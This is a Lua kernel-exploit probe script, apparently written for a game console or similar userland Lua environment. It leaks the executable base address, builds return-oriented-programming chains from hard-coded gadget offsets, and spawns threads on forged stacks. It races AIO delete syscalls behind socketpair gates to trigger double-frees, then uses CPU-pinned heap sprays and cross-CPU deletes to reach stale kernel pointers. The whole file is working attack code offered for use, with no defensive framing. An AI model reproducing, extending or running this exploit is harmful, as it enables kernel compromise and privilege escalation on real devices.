-- CRASH_CLASS: HIGH
-- PROBE 67j: Gated double-free + cross-CPU spray + sequential delete
--
-- 67i2 confirmed: socketpair gate reliably fires the race (60 doubles/30 iters).
-- Now: after double-free, pin to CPU 0 to spray, then CPU 1 to spray.
-- Delete CPU 0's first → CPU 1's deletes follow stale pointers if objects overlap.
-- Also test: socketpair AIO (blocking read for timing control).

print("=== PROBE 67j: GATED CROSS-CPU ===")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function fmt(val) if val==nil then return "nil" end local h,l=get_hi_lo(val) return string.format("0x%08X%08X",h,l) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end
local function put_str(s) local p=memory.alloc(#s+2) for i=1,#s do pcall(function() memory.write_byte(p+i-1,string.byte(s,i)) end) end pcall(function() memory.write_byte(p+#s,0) end) return p end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib)+0x108) or 0; local ehi = rd(N(ib)+0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa)+8, 0); wq(uint64(N(sa)+16), uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0)); wq(N(reqs)+8, uint64(16))
    local bh,bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
    local rh,rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
    wd(N(reqs)+0x20, fd_zero); wd(N(reqs)+0x24, 0); wd(N(one_id), 0)
    pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(1),uint64(N(one_id))) end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)),uint64(1),uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end

-- CPU pinning
local pin_buf = memory.alloc(8)
local function set_cpu(mask)
    wq(N(pin_buf), uint64(mask))
    pcall(function() mk(488)(uint64(3),uint64(2),uint64(pid_val),uint64(8),uint64(N(pin_buf))) end)
end

-- Gate socketpairs
local sp_A = memory.alloc(16); wd(N(sp_A),0xFFFFFFFF); wd(N(sp_A)+4,0xFFFFFFFF)
pcall(function() mk(135)(uint64(1),uint64(2),uint64(0),uint64(N(sp_A))) end)
local gra = rd(N(sp_A)) or -1; local gwa = rd(N(sp_A)+4) or -1
local sp_B = memory.alloc(16); wd(N(sp_B),0xFFFFFFFF); wd(N(sp_B)+4,0xFFFFFFFF)
pcall(function() mk(135)(uint64(1),uint64(2),uint64(0),uint64(N(sp_B))) end)
local grb = rd(N(sp_B)) or -1; local gwb = rd(N(sp_B)+4) or -1
print(string.format("gates: A=%d/%d B=%d/%d", gra, gwa, grb, gwb))
if gra < 0 or gwb < 0 then print("GATE FAIL"); return end

local del_ids = memory.alloc(4*BATCH+0x10)
local states_A = memory.alloc(4*BATCH+0x10)
local states_B = memory.alloc(4*BATCH+0x10)
local marker_A = memory.alloc(8); local marker_B = memory.alloc(8)
local tmp_A = memory.alloc(8); local tmp_B = memory.alloc(8)
local wbyte = memory.alloc(8); wd(N(wbyte), 0x42)
local stk_A = memory.alloc(0x4000); local stk_B = memory.alloc(0x4000)

-- =============================================
-- [A] GATED DOUBLE-FREE (3 rounds for enough doubles)
-- =============================================
print(""); print("-- [A] GATED DOUBLE-FREE (no pin) --")
-- Do NOT pin during race — 67i2 proved unpinned works, pinned doesn't

local total_df = 0
for round = 1, 10 do
    if not alive() then break end
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids+1] = id end
    end
    if #ids < BATCH then break end

    for i = 0, BATCH-1 do
        wd(N(del_ids)+i*4, ids[i+1])
        wd(N(states_A)+i*4, 0xAA); wd(N(states_B)+i*4, 0xBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    local sb_a = N(stk_A)
    for i = 0, 0x1FFC, 4 do wd(sb_a+i, 0) end
    local spa2 = sb_a + 0x2000 - ((sb_a+0x2000)%16) - 8
    local oa = 0
    local function wa(v) wq(spa2+oa, v); oa = oa+8 end
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    wa(g_pop_rax); wa(uint64(3)); wa(g_pop_rdi); wa(uint64(gra))
    wa(g_pop_rsi); wa(uint64(N(tmp_A))); wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    wa(g_pop_rdi); wa(uint64(N(del_ids))); wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A))); wa(g_pop_rax); wa(uint64(662)); wa(stub)
    wa(g_pop_rdi); wa(uint64(0)); wa(g_pop_rax); wa(uint64(431)); wa(stub)

    local sb_b = N(stk_B)
    for i = 0, 0x1FFC, 4 do wd(sb_b+i, 0) end
    local spb2 = sb_b + 0x2000 - ((sb_b+0x2000)%16) - 8
    local ob = 0
    local function wb(v) wq(spb2+ob, v); ob = ob+8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3)); wb(g_pop_rdi); wb(uint64(grb))
    wb(g_pop_rsi); wb(uint64(N(tmp_B))); wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids))); wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B))); wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0)); wb(g_pop_rax); wb(uint64(431)); wb(stub)

    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa)+i, 0) end
    wq(N(pa), g_bare_ret); wq(N(pa)+0x10, uint64(sb_a)); wq(N(pa)+0x18, uint64(0x2000))
    local pb2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb2)+i, 0) end
    wq(N(pb2), g_bare_ret); wq(N(pb2)+0x10, uint64(sb_b)); wq(N(pb2)+0x18, uint64(0x2000))

    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb2, uint64(0x38)) end)

    local ar, br = false, false
    for w = 1, 500000 do
        if not ar and N(rq(N(marker_A)) or uint64(0)) ~= 0 then ar = true end
        if not br and N(rq(N(marker_B)) or uint64(0)) ~= 0 then br = true end
        if ar and br then break end
    end
    if not (ar and br) then print("  MARKER TIMEOUT"); break end
    for d = 1, 500 do end
    pcall(function() mk(4)(uint64(gwa), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gwb), uint64(N(wbyte)), uint64(1)) end)
    for w = 1, 100000 do end

    local df = 0
    for i = 0, BATCH-1 do
        if (rd(N(states_A)+i*4) or 0xAA) == 0 and (rd(N(states_B)+i*4) or 0xBB) == 0 then df = df+1 end
    end
    total_df = total_df + df
    if df > 0 then print(string.format("  round %d: %d doubles (total=%d)", round, df, total_df)) end
    if total_df >= 6 then break end
end

print("total_doubles=" .. total_df)
if total_df < 2 then print("INSUFFICIENT"); return end
if not alive() then print("DEAD"); return end

-- =============================================
-- [B] SPRAY from CPU 0 then CPU 1
-- =============================================
print(""); print("-- [B] SPRAY: CPU0 (80) + CPU1 (80) --")

set_cpu(1)  -- CPU 0 only
local cpu0_ids = {}
for i = 1, 80 do
    local id = submit_one()
    if id ~= 0 then cpu0_ids[#cpu0_ids+1] = id end
end

set_cpu(2)  -- CPU 1 only
local cpu1_ids = {}
for i = 1, 80 do
    local id = submit_one()
    if id ~= 0 then cpu1_ids[#cpu1_ids+1] = id end
end

print(string.format("  cpu0=%d cpu1=%d", #cpu0_ids, #cpu1_ids))

-- Poll all
set_cpu(3)
for _,id in ipairs(cpu0_ids) do poll_one(id) end
for _,id in ipairs(cpu1_ids) do poll_one(id) end

if not alive() then print("DEAD after spray"); return end

-- =============================================
-- [C] DELETE CPU0 FIRST
-- =============================================
print(""); print("-- [C] DELETE CPU0 (from CPU 0) --")
set_cpu(1)
local d0_ok, d0_fail = 0, 0
for _, id in ipairs(cpu0_ids) do
    local st = delete_one(id)
    if st == 0 then d0_ok = d0_ok+1 else d0_fail = d0_fail+1 end
end
print(string.format("  ok=%d fail=%d", d0_ok, d0_fail))

if not alive() then print("DEAD after cpu0 del"); return end

-- =============================================
-- [D] DELETE CPU1 (observe anomalies)
-- =============================================
print(""); print("-- [D] DELETE CPU1 (from CPU 1) --")
set_cpu(2)
local d1_ok, d1_fail, d1_crash = 0, 0, 0
local anom = {}
for i, id in ipairs(cpu1_ids) do
    if not alive() then d1_crash = #cpu1_ids - i + 1; break end
    local st = delete_one(id)
    if st == 0 then d1_ok = d1_ok+1
    else d1_fail = d1_fail+1
        if #anom < 8 then anom[#anom+1] = string.format("id=0x%X st=0x%08X", id, st) end
    end
end
print(string.format("  ok=%d fail=%d crash=%d", d1_ok, d1_fail, d1_crash))
for _,s in ipairs(anom) do print("  * " .. s) end

-- =============================================
-- [E] SOCKETPAIR AIO READ TEST
-- =============================================
if alive() then
    print(""); print("-- [E] SOCKETPAIR AIO READ --")
    set_cpu(3)
    local tsp = memory.alloc(16); wd(N(tsp), 0xFFFFFFFF); wd(N(tsp)+4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(tsp))) end)
    local tfd0 = rd(N(tsp)) or -1; local tfd1 = rd(N(tsp)+4) or -1
    print(string.format("  pair: fd0=%d fd1=%d", tfd0, tfd1))

    if tfd0 > 0 and tfd1 > 0 then
        local aio_res = memory.alloc(8); wd(N(aio_res), 0xDEAD)
        local aio_data = memory.alloc(64)
        for i = 0, 60, 4 do wd(N(aio_data)+i, 0xCC) end

        -- Submit AIO read on socketpair fd0
        wq(N(reqs), uint64(1))  -- cmd=1 (read)
        wq(N(reqs)+8, uint64(16))
        local bh,bl = get_hi_lo(uint64(N(aio_data)))
        wd(N(reqs)+0x10, bl); wd(N(reqs)+0x14, bh)
        local rh,rl = get_hi_lo(uint64(N(aio_res)))
        wd(N(reqs)+0x18, rl); wd(N(reqs)+0x1C, rh)
        wd(N(reqs)+0x20, tfd0); wd(N(reqs)+0x24, 0); wd(N(one_id), 0)
        pcall(function() mk(669)(uint64(1),uint64(N(reqs)),uint64(1),uint64(1),uint64(N(one_id))) end)
        local aid = rd(N(one_id)) or 0
        local r0 = rd(N(aio_res)) or 0xDEAD
        print(string.format("  submit: id=0x%X result=0x%X", aid, r0))

        if aid > 0 then
            -- Write data to fd1
            local wb2 = memory.alloc(16)
            for i = 0, 12, 4 do wd(N(wb2)+i, 0x41424344) end
            pcall(function() mk(4)(uint64(tfd1), uint64(N(wb2)), uint64(16)) end)
            for w = 1, 50000 do end

            local r1 = rd(N(aio_res)) or 0xDEAD
            local d0_val = rd(N(aio_data)) or 0xCC
            print(string.format("  after_write: result=0x%X data=0x%X", r1, d0_val))

            poll_one(aid); delete_one(aid)
        end
        pcall(function() mk(6)(uint64(tfd0)) end)
        pcall(function() mk(6)(uint64(tfd1)) end)
    end
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 67j DONE ===")
